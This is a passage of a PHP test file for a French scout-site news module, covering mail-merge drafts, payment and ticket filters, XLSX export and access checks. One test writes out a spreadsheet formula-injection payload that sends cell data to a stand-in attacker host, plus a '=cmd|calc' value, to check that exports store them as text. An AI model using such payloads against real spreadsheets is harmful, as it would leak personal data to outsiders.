        $response = $this->formControllerWithMassMail($draft)->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
            ], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(302, $response->getStatusCode());
        $this->assertSame('/news/' . $articleId . '/form/responses', $response->getHeaders()['Location'] ?? null);
        $this->assertSame(
            ['type' => 'error', 'message' => 'Personne à qui écrire : aucune ligne ne porte un membre ou une adresse.'],
            \Core\Http\FlashMessage::get()
        );
    }

    /**
     * A technical failure of the mass-mail module never reaches the chief's
     * screen in its own words (AGENTS.md, messages that reach a reader): a
     * SQL error names a table. The screen gets one French sentence of ours;
     * the real cause is journaled — as the exception CLASS only, because a
     * message may carry personal data.
     */
    public function testAMailDraftThatFailsTechnicallyShowsOurSentenceAndJournalsTheClass(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $draft = $this->createStub(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $draft->method('createMergeDraft')->willThrowException(
            new \PDOException('SQLSTATE[HY000]: General error: 1 no such table: mass_mail_audiences')
        );
        $this->journalService->expects($this->once())->method('log')->with(
            'news',
            'mail_draft_failed',
            'warning',
            $this->isString(),
            $this->callback(static function (array $context): bool {
                return ($context['error'] ?? null) === \PDOException::class
                    && !str_contains((string) json_encode($context), 'mass_mail_audiences');
            }),
            $this->anything()
        );

        $response = $this->formControllerWithMassMail($draft)->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
            ], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame('/news/' . $articleId . '/form/responses', $response->getHeaders()['Location'] ?? null);
        $flash = \Core\Http\FlashMessage::get();
        $this->assertSame('error', $flash['type'] ?? null);
        $this->assertSame(
            "Le brouillon de courrier n'a pas pu être créé. Réessayez dans un instant.",
            $flash['message'] ?? null
        );
        $this->assertStringNotContainsString('SQLSTATE', (string) ($flash['message'] ?? ''));
        $this->assertStringNotContainsString('mass_mail_audiences', (string) ($flash['message'] ?? ''));
    }

    /**
     * The journal shares the connection that just failed: when it cannot be
     * written either, the chief still gets the sentence and the redirect, not
     * an error page.
     */
    public function testAMailDraftFailureStillAnswersWhenTheJournalCannotBeWritten(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $draft = $this->createStub(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $draft->method('createMergeDraft')->willThrowException(new \PDOException('MySQL server has gone away'));
        $this->journalService->method('log')->willThrowException(new \PDOException('MySQL server has gone away'));

        $response = $this->formControllerWithMassMail($draft)->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
            ], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame('/news/' . $articleId . '/form/responses', $response->getHeaders()['Location'] ?? null);
        $this->assertSame(
            "Le brouillon de courrier n'a pas pu être créé. Réessayez dans un instant.",
            \Core\Http\FlashMessage::get()['message'] ?? null
        );
    }

    private function articleWithOneResponse(string $responseRoleMin = 'chief'): int
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, $responseRoleMin, null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        return $articleId;
    }

    // --- IT-05: the cold follow-up ---

    /**
     * A ticketed, paid form with four responses spanning the whole cross:
     * entered+paid, entered+unpaid, paid+absent, and neither.
     *
     * @return array{article: int, form: int, responses: array<string, int>}
     */
    private function crossedEvent(): array
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create(
            $articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED,
            null, null, false, 'chief', null, 7, true, '2026-03-14', 'Salle'
        );
        $nameField = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $seatField = $this->fieldRepository->create($formId, 1, FormField::TYPE_NUMBER, 'Repas adulte', false, null, null, 100, 15.0, null);

        $tickets = new \Modules\News\Service\TicketService($this->responseRepository);
        $ids = [];
        foreach ([
            'in_paid' => ['Roskam', 11, true],
            'in_unpaid' => ['Delvaux', 12, true],
            'paid_absent' => ['Herremans', 13, false],
            'neither' => ['Delacroix', 14, false],
        ] as $key => [$name, $receivableId, $used]) {
            $id = $this->responseRepository->create(
                $formId, null, null, strtolower($name) . '@test.com',
                [$nameField => $name, $seatField => '2'],
                '+++100/0000/000' . $receivableId . '+++',
                $receivableId
            );
            $tickets->issueFor($this->responseRepository->findById($id));
            if ($used) {
                $tickets->markUsed($this->responseRepository->findById($id), new \DateTimeImmutable('2026-03-14 19:42:00'));
            }
            $ids[$key] = $id;
        }

        return ['article' => $articleId, 'form' => $formId, 'responses' => $ids];
    }

    private function receivablesStub(): \Modules\Finance\Api\ExpectedReceivableInterface
    {
        $stub = $this->createStub(\Modules\Finance\Api\ExpectedReceivableInterface::class);
        $stub->method('getReceivableStatus')->willReturnCallback(
            static fn (int $id): array => in_array($id, [11, 13], true)
                ? ['amount_due' => 3000, 'amount_received' => 3000, 'status' => 'paid']
                : ['amount_due' => 3000, 'amount_received' => 0, 'status' => 'unpaid']
        );

        return $stub;
    }

    private function responsesBody(int $articleId, string $filter = 'all', ?\Modules\Finance\Api\StatementImportStatusInterface $status = null): string
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        return $this->formControllerWithFinance($this->receivablesStub(), $status)->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', $filter === 'all' ? [] : ['filter' => $filter], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();
    }

    public function testTheResponsesScreenShowsTheTicketStateBesideThePayment(): void
    {
        $event = $this->crossedEvent();

        $body = $this->responsesBody($event['article']);

        $this->assertStringContainsString('Entré 19:42', $body);
        $this->assertStringContainsString('Non venu', $body);
        // The payment is still there, and still first: it is the state
        // that can change a decision.
        $this->assertStringContainsString('Payé', $body);
    }

    public function testTheCrossFilterCountsEachOfItsThreeAnswers(): void
    {
        $this->crossedEvent();

        $body = $this->responsesBody($this->articleRepository->findAll()[0]->id);

        // Four in all; one entered and unpaid; one paid and never came.
        $this->assertStringContainsString('Toutes (4)', $body);
        $this->assertStringContainsString('Entrés sans paiement (1)', $body);
        $this->assertStringContainsString('Payé, jamais venu (1)', $body);
    }

    public function testTheEnteredAndUnpaidFilterKeepsOnlyThatOne(): void
    {
        $event = $this->crossedEvent();

        $body = $this->responsesBody($event['article'], 'in_unpaid');

        $this->assertStringContainsString('Delvaux', $body);
        $this->assertStringNotContainsString('Roskam', $body);
        $this->assertStringNotContainsString('Herremans', $body);
    }

    public function testThePaidAndAbsentFilterKeepsOnlyThatOne(): void
    {
        $event = $this->crossedEvent();

        $body = $this->responsesBody($event['article'], 'paid_absent');

        $this->assertStringContainsString('Herremans', $body);
        $this->assertStringNotContainsString('Delacroix', $body, 'never paid, so not on this list');
        $this->assertStringNotContainsString('Roskam', $body, 'paid but came, so not on this list');
    }

    public function testAnUnknownFilterFallsBackToShowingEverybody(): void
    {
        $event = $this->crossedEvent();

        $body = $this->responsesBody($event['article'], 'n-importe-quoi');

        $this->assertStringContainsString('Roskam', $body);
        $this->assertStringContainsString('Delacroix', $body);
    }

    public function testTheEnteredAndUnpaidListNamesTheBankLagAndItsDate(): void
    {
        // Without this caption somebody sends a reminder to people who are
        // perfectly in order: a transfer made yesterday is not known here
        // until the next statement is imported.
        $event = $this->crossedEvent();
        $status = $this->createMock(\Modules\Finance\Api\StatementImportStatusInterface::class);
        $status->expects($this->atLeastOnce())->method('lastStatementImportedAt')->with(7)->willReturn('2026-02-21 08:00:00');

        $body = $this->responsesBody($event['article'], 'in_unpaid', $status);

        $this->assertStringContainsString('Dernier extrait bancaire importé le', $body);
        $this->assertStringContainsString('21 février 2026', $body);
        $this->assertStringContainsString("Vérifiez avant d'envoyer un rappel", $body);
    }

    public function testTheWarningSaysSoWhenNoStatementWasEverImported(): void
    {
        $event = $this->crossedEvent();
        $status = $this->createStub(\Modules\Finance\Api\StatementImportStatusInterface::class);
        $status->method('lastStatementImportedAt')->willReturn(null);

        $body = $this->responsesBody($event['article'], 'in_unpaid', $status);

        $this->assertStringContainsString("Aucun extrait bancaire n'a encore été importé", $body);
    }

    public function testTheWarningIsAbsentFromTheOtherFilters(): void
    {
        $event = $this->crossedEvent();
        $status = $this->createStub(\Modules\Finance\Api\StatementImportStatusInterface::class);
        $status->method('lastStatementImportedAt')->willReturn('2026-02-21 08:00:00');

        $this->assertStringNotContainsString('Dernier extrait bancaire', $this->responsesBody($event['article'], 'all', $status));
        $this->assertStringNotContainsString('Dernier extrait bancaire', $this->responsesBody($event['article'], 'paid_absent', $status));
    }

    public function testAFormWithNoTicketKeepsTheScreenItAlwaysHad(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $body = $this->formControllerWithFinance($this->receivablesStub())->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringNotContainsString('Entrés sans paiement', $body);
        $this->assertStringNotContainsString('Non venu', $body);
    }

    public function testTheExportCarriesTheFilterAndTheTicketColumns(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->formControllerWithFinance($this->receivablesStub())->exportResponses(
            new Request('GET', '/news/' . $event['article'] . '/form/responses/export', ['filter' => 'in_unpaid'], [], [], []),
            ['id' => (string) $event['article']]
        );

        $this->assertSame(200, $response->getStatusCode());

        $path = tempnam(sys_get_temp_dir(), 'news-export-') . '.xlsx';
        file_put_contents($path, $response->getBody());
        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($path)->getActiveSheet();
        $rows = $sheet->toArray();
        @unlink($path);

        // A download that quietly held more people than the list above it
        // would be worse than no filter at all.
        $this->assertCount(2, $rows, 'one header row and the single entered-and-unpaid response');
        $this->assertContains('Référence du billet', $rows[0]);
        $this->assertContains('État du billet', $rows[0]);
        // And the money is still complete: an export saying only
        // « payé / impayé » would send a treasurer back to the site.
        $this->assertContains('Montant attendu', $rows[0]);
        $this->assertContains('Montant reçu', $rows[0]);
        $this->assertContains('Entré', $rows[1]);
    }

    public function testTheMailDraftOffersTheTicketAndItsQrAsMergeVariables(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $captured = [];
        $response = $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
            ->createMailDraft(
                new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                ], [], []),
                ['id' => (string) $event['article']]
            );

        $this->assertSame(302, $response->getStatusCode());
        $this->assertContains('Référence du billet', $captured['columns']);
        $this->assertContains('QR du billet', $captured['columns']);

        // The QR travels as an absolute URL: a mail-merge body is
        // sanitized on the way in, and that sanitizer refuses `data:`.
        $qrUrl = $captured['rows'][0]['values']['QR du billet'];
        $this->assertStringStartsWith('https://example.be/news/qr/', $qrUrl);
        $this->assertMatchesRegularExpression('#/news/qr/[A-Z0-9]{10}/[0-9a-f]{16,}$#', $qrUrl);
        $this->assertMatchesRegularExpression(
            '/\A[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{2}\z/',
            $captured['rows'][0]['values']['Référence du billet']
        );
    }

    // -----------------------------------------------------------------
    // Choosing the audience at the click (specifications.md §29.7)
    // -----------------------------------------------------------------

    public function testTheWriteButtonAsksWhichAudienceWhenTheFormExpectsMoney(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $body = (string) $this->formControllerWithMassMail($this->stubDraftProvider(), $this->receivablesStub())
            ->responses(new Request('GET', '/news/' . $event['article'] . '/form/responses', [], [], [], []), ['id' => (string) $event['article']])
            ->getBody();

        $this->assertStringContainsString('data-bs-target="#mail-draft-audience"', $body);
        $this->assertStringContainsString('Tous les répondants (4)', $body);
        $this->assertStringContainsString("Seulement ceux qui n'ont pas fini de payer (2)", $body);
    }

    /**
     * The lag is the whole reason this dialog can do harm: « ceux qui
     * n'ont pas fini de payer » contains, alongside the real ones,
     * everybody who paid after the last statement was imported.
     */
    public function testTheAudienceDialogAnnouncesTheBankLag(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $status = $this->createStub(\Modules\Finance\Api\StatementImportStatusInterface::class);
        $status->method('lastStatementImportedAt')->willReturn('2026-02-21 08:00:00');

        $controller = new FormController(
            $this->twig, $this->articleService, $this->formService, $this->responseService,
            $this->scoutYearService, $this->journalService, $this->receivablesStub(), null,
            $this->stubDraftProvider(), 'https://example.be', $status,
            new \Modules\News\Service\TicketQrTokenService($this->encryption)
        );

        $body = (string) $controller
            ->responses(new Request('GET', '/news/' . $event['article'] . '/form/responses', [], [], [], []), ['id' => (string) $event['article']])
            ->getBody();

        $this->assertStringContainsString('Dernier extrait bancaire importé le', $body);
        $this->assertStringContainsString('peut-être des personnes parfaitement en règle', $body);
    }

    /**
     * A form that expects no payment has only one possible answer, and a
     * dialog offering one option is a click that decides nothing.
     */
    public function testAFormWithNoPaymentWritesStraightAwayWithNoDialog(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $body = (string) $this->formControllerWithMassMail()
            ->responses(new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []), ['id' => (string) $articleId])
            ->getBody();

        $this->assertStringNotContainsString('mail-draft-audience', $body);
        $this->assertStringContainsString('/form/responses/mail-draft', $body);
    }

    public function testWritingToThoseWhoStillOweLeavesThePaidOnesOut(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $captured = [];
        $response = $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
            ->createMailDraft(
                new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                    'audience' => 'unpaid',
                ], [], []),
                ['id' => (string) $event['article']]
            );

        $this->assertSame(302, $response->getStatusCode());
        $addresses = array_column($captured['rows'], 'email');
        sort($addresses);
        // Roskam and Herremans are paid; the other two still owe.
        $this->assertSame(['delacroix@test.com', 'delvaux@test.com'], $addresses);
    }

    /**
     * The two selections are not the same question, and both are honoured:
     * the screen's filter says what the chief is looking at, the dialog
     * says who among them is meant.
     */
    public function testTheAudienceNarrowsWhatTheScreenFilterAlreadySelected(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $captured = [];
        $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
            ->createMailDraft(
                new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                    'filter' => 'in_unpaid',
                    'audience' => 'unpaid',
                ], [], []),
                ['id' => (string) $event['article']]
            );

        // « Entré et impayé » already holds Delvaux alone; asking for the
        // unpaid among them changes nothing, and must not widen it back.
        $this->assertSame(['delvaux@test.com'], array_column($captured['rows'], 'email'));
    }

    /**
     * The choice decides WHO receives, never WHAT is available: every
     * column is a variable on both audiences (§29.2, IT-03).
     */
    public function testTheAudienceChoiceDoesNotRestrictTheMergeVariables(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $all = [];
        $unpaid = [];
        foreach ([['all', &$all], ['unpaid', &$unpaid]] as [$audience, &$captured]) {
            $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
                ->createMailDraft(
                    new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                        '_csrf_token' => CsrfGuard::generateToken(),
                        'audience' => $audience,
                    ], [], []),
                    ['id' => (string) $event['article']]
                );
        }
        unset($captured);

        $this->assertSame($all['columns'], $unpaid['columns']);
        $this->assertContains('Montant attendu', $unpaid['columns']);
    }

    /**
     * The claim `FormController` had been making in its own docblock,
     * finally true: the export and the merge variables read ONE column
     * definition (Service\ResponseColumns), so they cannot describe the
     * same form differently.
     *
     * It was false. The export carried « Montant attendu », « Montant
     * reçu », « Communication structurée » and « Statut paiement », and
     * the variables did not — on the argument that those are accounting
     * figures rather than something to put in a mail. Too broad: it holds
     * for « rendez-vous samedi à 18h », not for a payment reminder, where
     * the amount is the message.
     */
    public function testTheExportAndTheMergeVariablesDescribeTheSameColumns(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $captured = [];
        $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
            ->createMailDraft(
                new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                ], [], []),
                ['id' => (string) $event['article']]
            );

        $header = $this->exportHeader($event['article']);

        $this->assertSame($header, $captured['columns'], 'one definition, same order, on both surfaces');
        $this->assertContains('Montant attendu', $captured['columns']);
        $this->assertContains('Montant reçu', $captured['columns']);
        $this->assertContains('Communication structurée', $captured['columns']);
        $this->assertContains('Statut paiement', $captured['columns']);
    }

    /**
     * « Statut paiement » is now read by a family, so what it contains
     * matters: French words, never an internal code and never the
     * English « unpaid » the finance module stores.
     */
    public function testThePaymentColumnsReachTheComposerAsSomethingAFamilyCanRead(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $captured = [];
        $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
            ->createMailDraft(
                new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                ], [], []),
                ['id' => (string) $event['article']]
            );

        $byAddress = [];
        foreach ($captured['rows'] as $row) {
            $byAddress[$row['email']] = $row['values'];
        }

        $this->assertSame('Payé', $byAddress['roskam@test.com']['Statut paiement']);
        $this->assertSame('Non payé', $byAddress['delvaux@test.com']['Statut paiement']);
        $this->assertSame('30,00 €', $byAddress['roskam@test.com']['Montant attendu']);
        $this->assertSame('0,00 €', $byAddress['delvaux@test.com']['Montant reçu']);
        $this->assertSame('+++100/0000/00012+++', $byAddress['delvaux@test.com']['Communication structurée']);
    }

    /**
     * The export's two numeric cells survive the convergence: a formula
     * a treasurer can read and adjust, and a real number a column of
     * which can be summed. Sharing the column list must not turn a
     * spreadsheet into a wall of strings.
     */
    public function testTheExportStillWritesTheAmountsAsAFormulaAndANumber(): void
    {
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $sheet = $this->exportSheet($event['article']);
        $header = $sheet->toArray()[0];
        $dueColumn = \PhpOffice\PhpSpreadsheet\Cell\Coordinate::stringFromColumnIndex(
            (int) array_search('Montant attendu', $header, true) + 1
        );
        $receivedColumn = \PhpOffice\PhpSpreadsheet\Cell\Coordinate::stringFromColumnIndex(
            (int) array_search('Montant reçu', $header, true) + 1
        );

        $this->assertStringStartsWith('=', (string) $sheet->getCell($dueColumn . '2')->getValue());
        $this->assertIsFloat($sheet->getCell($receivedColumn . '2')->getValue() + 0.0);
    }

    /**
     * @return string[]
     */
    private function exportHeader(int $articleId): array
    {
        return array_map(static fn ($value): string => (string) $value, $this->exportSheet($articleId)->toArray()[0]);
    }

    private function exportSheet(int $articleId): \PhpOffice\PhpSpreadsheet\Worksheet\Worksheet
    {
        $response = $this->formControllerWithFinance($this->receivablesStub())->exportResponses(
            new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []),
            ['id' => (string) $articleId]
        );

        $path = tempnam(sys_get_temp_dir(), 'news-export-') . '.xlsx';
        file_put_contents($path, (string) $response->getBody());
        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($path)->getActiveSheet();
        @unlink($path);

        return $sheet;
    }

    public function testTheMailDraftBodyPutsTheQrWhereAChiefCouldNot(): void
    {
        // A chief cannot insert this by hand: the composer's image button
        // takes a URL, and this one is a merge variable that only
        // resolves per recipient. The rest of the message is still theirs
        // to write, and the block can be deleted.
        $event = $this->crossedEvent();
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $captured = [];
        $this->formControllerWithMassMail($this->recordingDraftProvider($captured), $this->receivablesStub())
            ->createMailDraft(
                new Request('POST', '/news/' . $event['article'] . '/form/responses/mail-draft', [], [
                    '_csrf_token' => CsrfGuard::generateToken(),
                ], [], []),
                ['id' => (string) $event['article']]
            );

        $body = (string) $captured['body'];
        $this->assertStringContainsString('<img src="{{QR du billet}}"', $body);
        // Wrapped in a section, so a response with no reference yet gets
        // the message without an empty frame.
        $this->assertStringContainsString('{{#Référence du billet}}', $body);
        $this->assertStringContainsString('{{/Référence du billet}}', $body);
    }

    public function testAFormWithNoTicketLeavesTheComposerEmptyAsBefore(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $captured = [];
        $this->formControllerWithMassMail($this->recordingDraftProvider($captured))->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], [
                '_csrf_token' => CsrfGuard::generateToken(),
            ], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertNull($captured['body']);
        $this->assertNotContains('Référence du billet', $captured['columns']);
    }

    private function formControllerWithMassMail(
        ?\Modules\MassMail\Api\MassMailDraftInterface $draft = null,
        ?\Modules\Finance\Api\ExpectedReceivableInterface $receivables = null
    ): FormController {
        $draft ??= $this->stubDraftProvider();

        return new FormController(
            $this->twig,
            $this->articleService,
            $this->formService,
            $this->responseService,
            $this->scoutYearService,
            $this->journalService,
            $receivables,
            null,
            $draft,
            'https://example.be',
            null,
            new \Modules\News\Service\TicketQrTokenService($this->encryption)
        );
    }

    /**
     * A FormController that can see money and the last statement import —
     * what the « entrés sans paiement » filter and its caption need.
     */
    private function formControllerWithFinance(
        \Modules\Finance\Api\ExpectedReceivableInterface $receivables,
        ?\Modules\Finance\Api\StatementImportStatusInterface $statementStatus = null
    ): FormController {
        return new FormController(
            $this->twig,
            $this->articleService,
            $this->formService,
            $this->responseService,
            $this->scoutYearService,
            $this->journalService,
            $receivables,
            null,
            null,
            'https://example.be',
            $statementStatus,
            new \Modules\News\Service\TicketQrTokenService($this->encryption)
        );
    }

    private function stubDraftProvider(): \Modules\MassMail\Api\MassMailDraftInterface
    {
        $stub = $this->createStub(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $stub->method('createMergeDraft')->willReturn('/mass-mail/7');

        return $stub;
    }

    /**
     * @param array<string, mixed> $captured
     */
    private function recordingDraftProvider(array &$captured): \Modules\MassMail\Api\MassMailDraftInterface
    {
        $stub = $this->createStub(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $stub->method('createMergeDraft')->willReturnCallback(
            function (
                string $label,
                string $subject,
                array $columns,
                array $rows,
                string $actorRole,
                string $actorEmail,
                ?int $actorAccountId,
                ?string $bodyHtml = null
            ) use (&$captured): string {
                $captured = [
                    'label' => $label,
                    'subject' => $subject,
                    'columns' => $columns,
                    'rows' => $rows,
                    'body' => $bodyHtml,
                ];

                return '/mass-mail/7';
            }
        );

        return $stub;
    }

    public function testExportResponsesReturnsAnXlsxFile(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        $response = $this->formController->exportResponses(new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', $response->getHeaders()['Content-Type']);
        $this->assertStringStartsWith('PK', $response->getBody());
    }

    /**
     * POST /news/{id}/form/submit is public, so a form answer is
     * attacker-controlled. It must never become a live formula in the
     * XLSX a chief opens — the CSV/spreadsheet formula-injection class,
     * where =HYPERLINK(...) would exfiltrate the other rows' PII on open.
     */
    public function testExportedAnswersAreWrittenAsTextNotFormulas(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $payload = '=HYPERLINK("https://evil.example/?d="&A2,"Cliquez")';
        $this->responseRepository->create($formId, null, null, '=cmd|calc', [$fieldId => $payload], null, null);

        $response = $this->formController->exportResponses(
            new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []),
            ['id' => (string) $articleId]
        );

        $tmp = tempnam(sys_get_temp_dir(), 'news_export_') . '.xlsx';
        file_put_contents($tmp, $response->getBody());
        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($tmp)->getActiveSheet();
        @unlink($tmp);

        // Column 1 = contact, column 2 = the answer. Both are attacker text.
        $contactCell = $sheet->getCell([1, 2]);
        $answerCell = $sheet->getCell([2, 2]);

        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $answerCell->getDataType());
        $this->assertSame($payload, $answerCell->getValue(), 'stored verbatim as text, not evaluated');
        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $contactCell->getDataType());
        $this->assertSame('=cmd|calc', $contactCell->getValue());
    }

    public function testEditResponsePageRendersForOwnerWhileOpen(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $responseId = $this->responseRepository->create($formId, 55, null, 'me@test.com', [$fieldId => 'Bob'], null, null);

        AuthSession::login(55, 'me@test.com', 'identified');

        $response = $this->formController->editResponse(
            new Request('GET', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [], [], []),
            ['id' => (string) $articleId, 'response_id' => (string) $responseId]
        );

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Bob', $response->getBody());
    }

    public function testEditResponsePageRejectsADifferentAccount(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', null, null);
        $responseId = $this->responseRepository->create($formId, 55, null, 'me@test.com', [], null, null);

        AuthSession::login(56, 'other@test.com', 'identified');

        $response = $this->formController->editResponse(
            new Request('GET', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [], [], []),
            ['id' => (string) $articleId, 'response_id' => (string) $responseId]
        );

        // 404 and not 403 (#219): these routes are `public`, and a distinct
        // « exists but is not yours » let anyone count each form's responses
        // and learn which id belongs to which article — including articles
        // whose own page they may not open.
        $this->assertSame(404, $response->getStatusCode());
    }

    public function testPosterDownloadReturnsAPdf(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp d\'été', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $this->articleRepository->setShortUrlCode($id, 'abc123');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('application/pdf', $response->getHeaders()['Content-Type']);
        $this->assertStringStartsWith('%PDF-', $response->getBody());
    }

    /**
     * The poster carries the article's title, its summary and a QR code to
     * its short URL — so it needs show()'s visibility gate. Without it a
     * chief blocked from an admin-visibility article at /news/{id} could
     * still read all three straight out of the PDF.
     */
    public function testPosterIsRefusedForAnArticleTheViewerMayNotSee(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
